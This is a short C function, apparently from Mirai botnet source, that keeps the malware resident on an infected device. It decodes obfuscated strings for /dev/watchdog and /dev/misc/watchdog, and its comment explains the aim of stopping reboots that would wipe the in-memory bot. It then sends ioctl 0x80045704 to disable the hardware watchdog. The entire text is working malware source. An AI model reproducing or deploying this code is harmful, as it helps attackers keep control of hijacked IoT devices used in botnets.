/* Mirai only exists in memory device reboot = mirai gone so we write 0x80045704 to watchdog to disables the kernel watchdog to stop automatic reboots or atleast attempt to */

void noreboot(void)
{
    table_unlock(SLASH_DEV_WATCHDOG);       /* Unlock /dev/watchdog */
    table_unlock(SLASH_DEV_MISC_WATCHDOG);  /* Unlock /dev/misc/watchdog */

    int wfd = open(enc[SLASH_DEV_WATCHDOG].string, O_RDWR);
    if (wfd == -1) {
        /* Fallback /dev/misc/watchdog instead */
        wfd = open(enc[SLASH_DEV_MISC_WATCHDOG].string, O_RDWR);
        if (wfd == -1) {
            /* lock both tables */
            table_lock(SLASH_DEV_WATCHDOG);       /* Lock /dev/watchdog */
            table_lock(SLASH_DEV_MISC_WATCHDOG);  /* Lock /dev/misc/watchdog */
            return;
        }
    }

    ioctl(wfd, 0x80045704, 0); 
    close(wfd);

    table_lock(SLASH_DEV_WATCHDOG);
    table_lock(SLASH_DEV_MISC_WATCHDOG);
}
